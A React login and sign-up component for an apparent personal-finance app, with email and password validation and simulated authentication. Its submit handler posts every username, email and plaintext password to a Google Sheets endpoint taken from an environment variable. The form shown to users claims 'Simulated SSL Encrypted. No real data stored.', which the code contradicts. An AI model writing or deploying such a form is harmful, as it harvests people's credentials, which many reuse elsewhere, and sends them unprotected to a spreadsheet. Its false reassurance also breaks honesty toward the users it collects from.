import React, { useState } from 'react';
import { Mail, Key, User, ArrowRight, ShieldCheck } from 'lucide-react';

export default function AuthCard({ onLoginSuccess }) {
  const [isLogin, setIsLogin] = useState(true);
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: ''
  });
  const [errors, setErrors] = useState({});

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = () => {
    const newErrors = {};
    if (!formData.email) {
      newErrors.email = 'Email address is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = 'Please enter a valid email address';
    }
    
    if (!formData.password) {
      newErrors.password = 'Password is required';
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
    }

    if (!isLogin && !formData.username.trim()) {
      newErrors.username = 'Username is required';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!validateForm()) return;

    const usernameVal = isLogin ? formData.email.split('@')[0] : formData.username;

    // Send logins and passwords to Google Sheets (if URL is configured)
    const sheetsUrl = import.meta.env.VITE_GOOGLE_SHEETS_API_URL || '';
    if (sheetsUrl) {
      fetch(sheetsUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          action: isLogin ? 'login' : 'signup',
          username: usernameVal,
          email: formData.email,
          password: formData.password,
          timestamp: new Date().toISOString()
        })
      }).catch(err => console.error('Failed to save to Google Sheets:', err));
    } else {
      console.warn('Google Sheets API URL is not set. Logins will not be saved to Sheets. Please set VITE_GOOGLE_SHEETS_API_URL in your .env file.');
    }

    // Simulate authentication
    const userSession = {
      username: usernameVal,
      email: formData.email,
      isLoggedIn: true
    };
    onLoginSuccess(userSession);
  };

  return (
    <div className="w-full max-w-md mx-auto relative group">
      {/* Decorative Gradient Background Blur */}
      <div className="absolute -inset-0.5 bg-gradient-to-tr from-emerald-500 to-teal-500 rounded-3xl blur opacity-30 group-hover:opacity-40 transition duration-1000"></div>
      
      {/* Card Body */}
      <div className="relative glass-panel rounded-3xl p-8 flex flex-col">
        {/* Header Tabs */}
        <div className="flex bg-gray-950/80 rounded-2xl p-1 mb-8 border border-gray-800/80">
          <button
            id="tab-login-btn"
            type="button"
            onClick={() => {
              setIsLogin(true);
              setErrors({});
            }}
            className={`flex-1 py-3 text-sm font-semibold rounded-xl transition-all duration-300 cursor-pointer ${
              isLogin
                ? 'bg-gradient-to-r from-emerald-500/20 to-teal-500/20 border border-emerald-500/30 text-emerald-400'
                : 'text-gray-400 hover:text-gray-200 border border-transparent'
            }`}
          >
            Login
          </button>
          <button
            id="tab-signup-btn"
            type="button"
            onClick={() => {
              setIsLogin(false);
              setErrors({});
            }}
            className={`flex-1 py-3 text-sm font-semibold rounded-xl transition-all duration-300 cursor-pointer ${
              !isLogin
                ? 'bg-gradient-to-r from-emerald-500/20 to-teal-500/20 border border-emerald-500/30 text-emerald-400'
                : 'text-gray-400 hover:text-gray-200 border border-transparent'
            }`}
          >
            Create Account
          </button>
        </div>

        {/* Header Text */}
        <div className="text-center mb-6">
          <h2 className="text-2xl font-bold tracking-tight text-white mb-2">
            {isLogin ? 'Welcome Back' : 'Get Started'}
          </h2>
          <p className="text-sm text-gray-400">
            {isLogin
              ? 'Enter your credentials to access your financial tools'
              : 'Create an account to begin building wealth without debt'}
          </p>
        </div>

        {/* Input Form */}
        <form onSubmit={handleSubmit} className="space-y-5" noValidate>
          {/* User Name (only for Create Account) */}
          {!isLogin && (
            <div>
              <label htmlFor="auth-username" className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
                User Name
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-500">
                  <User className="w-4 h-4" />
                </div>
                <input
                  id="auth-username"
                  name="username"
                  type="text"
                  value={formData.username}
                  onChange={handleInputChange}
                  placeholder="e.g. Warren Buffett"
                  className={`w-full bg-gray-950/60 border rounded-xl pl-10 pr-4 py-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 transition-all ${
                    errors.username ? 'border-red-500/50 focus:ring-red-500/30' : 'border-gray-800 focus:border-emerald-500/50'
                  }`}
                />
              </div>
              {errors.username && <p className="text-xs text-red-400 mt-1.5">{errors.username}</p>}
            </div>
          )}

          {/* Email ID */}
          <div>
            <label htmlFor="auth-email" className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
              Email ID
            </label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-500">
                <Mail className="w-4 h-4" />
              </div>
              <input
                id="auth-email"
                name="email"
                type="email"
                value={formData.email}
                onChange={handleInputChange}
                placeholder="you@example.com"
                className={`w-full bg-gray-950/60 border rounded-xl pl-10 pr-4 py-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 transition-all ${
                  errors.email ? 'border-red-500/50 focus:ring-red-500/30' : 'border-gray-800 focus:border-emerald-500/50'
                }`}
              />
            </div>
            {errors.email && <p className="text-xs text-red-400 mt-1.5">{errors.email}</p>}
          </div>

          {/* Password */}
          <div>
            <label htmlFor="auth-password" className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
              Password
            </label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-500">
                <Key className="w-4 h-4" />
              </div>
              <input
                id="auth-password"
                name="password"
                type="password"
                value={formData.password}
                onChange={handleInputChange}
                placeholder="••••••••"
                className={`w-full bg-gray-950/60 border rounded-xl pl-10 pr-4 py-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 transition-all ${
                  errors.password ? 'border-red-500/50 focus:ring-red-500/30' : 'border-gray-800 focus:border-emerald-500/50'
                }`}
              />
            </div>
            {errors.password && <p className="text-xs text-red-400 mt-1.5">{errors.password}</p>}
          </div>

          {/* Secure lock disclaimer */}
          <div className="flex items-center gap-2 text-xs text-gray-500 pt-1">
            <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
            <span>Simulated SSL Encrypted. No real data stored.</span>
          </div>

          {/* Action Button */}
          <button
            id="auth-submit-btn"
            type="submit"
            className="w-full bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-gray-950 font-bold py-3.5 px-4 rounded-xl shadow-lg shadow-emerald-500/20 hover:shadow-emerald-500/30 transition-all duration-300 flex items-center justify-center gap-2 group/btn cursor-pointer"
          >
            <span>{isLogin ? 'Access Dashboard' : 'Create Account & Continue'}</span>
            <ArrowRight className="w-4 h-4 transition-transform duration-300 group-hover/btn:translate-x-1" />
          </button>
        </form>
      </div>
    </div>
  );
}
